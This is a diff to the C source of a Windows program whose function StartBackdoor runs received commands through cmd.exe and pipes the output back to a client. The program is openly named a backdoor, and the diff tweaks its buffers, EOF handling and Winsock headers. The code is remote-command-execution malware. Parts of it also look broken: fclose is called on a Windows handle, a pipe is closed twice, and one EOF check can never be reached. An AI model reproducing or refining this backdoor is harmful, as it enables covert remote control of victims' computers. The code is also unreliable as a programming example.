@@ -1,4 +1,10 @@
 #include "../include/config.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <conio.h>
 
 BOOL StartBackdoor(void) {
@@ -73,7 +79,7 @@ BOOL StartBackdoor(void) {
             }
 
             // Initialize standard STARTUPINFOW with pipe handles
-            STARTUPINFOW si = { 0 };
+            STARTUPINFOW si = {0};
             si.cb = sizeof(STARTUPINFOW);
             si.dwFlags = STARTF_USESTDHANDLES;
             si.hStdOutput = hWritePipe;
@@ -105,14 +111,14 @@ BOOL StartBackdoor(void) {
                             swprintf(cmdWide, 2048, L"cmd.exe /c \"%s\"", cmd);
                             
                             // CreateProcessW with pipe handles
-                            PROCESS_INFORMATION pi = { 0 };
+                            PROCESS_INFORMATION pi = {0};
                             if (CreateProcessW(NULL, cmdWide, NULL, NULL, TRUE, // bInheritHandles = TRUE
                                                CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
                                                NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
                                 printf("[BACKDOOR] Shell spawned! PID=%lu\n", pi.dwProcessId);
                                 fflush(stdout);
                                 
-                                // Cleanup pipe handle (keep read pipe open)
+                                // Cleanup write pipe (keep read pipe open)
                                 fclose(hWritePipe);
                                 
                                 // Read output from pipe
@@ -121,11 +127,11 @@ BOOL StartBackdoor(void) {
                                 
                                 while (stillRunning) {
                                     // Initialize buffer to 0
-                                    memset(temp, 0, 4096);
+                                    memset(temp, 0, sizeof(temp));
                                     
                                     // Read from pipe
                                     DWORD bytesRead = 0;
-                                    BOOL success = ReadFile(hReadPipe, temp, 4096, &bytesRead, NULL);
+                                    BOOL success = ReadFile(hReadPipe, temp, sizeof(temp) - 1, &bytesRead, NULL);
                                     
                                     if (success && bytesRead > 0) {
                                         // Send output to client
@@ -133,24 +139,27 @@ BOOL StartBackdoor(void) {
                                         printf("[BACKDOOR] Received Output: %.*s", (int)bytesRead, temp);
                                         fflush(stdout);
                                         
-                                        // Check if process ended
+                                        // Check if process ended (EOF)
                                         if (bytesRead == 0) {
                                             stillRunning = FALSE;
                                             printf("[BACKDOOR] Shell exited\n");
                                             fflush(stdout);
                                         }
+                                    } else if (bytesRead == 0 && success) {
+                                        // EOF check
+                                        stillRunning = FALSE;
+                                        printf("[BACKDOOR] Shell exited (EOF)\n");
+                                        fflush(stdout);
                                     } else {
-                                        if (bytesRead == 0) {
-                                            stillRunning = FALSE;
-                                        }
                                         printf("[BACKDOOR] ReadFile failed: %lu\n", (unsigned long)GetLastError());
                                         fflush(stdout);
+                                        stillRunning = FALSE;
                                     }
                                 }
                                 
                                 // Cleanup
                                 CloseHandle(hReadPipe);
-                                CloseHandle(hWritePipe); // Note: hReadPipe closed
+                                CloseHandle(hWritePipe);
                                 CloseHandle(pi.hThread);
                                 CloseHandle(pi.hProcess);
                                 free(cmdWide);
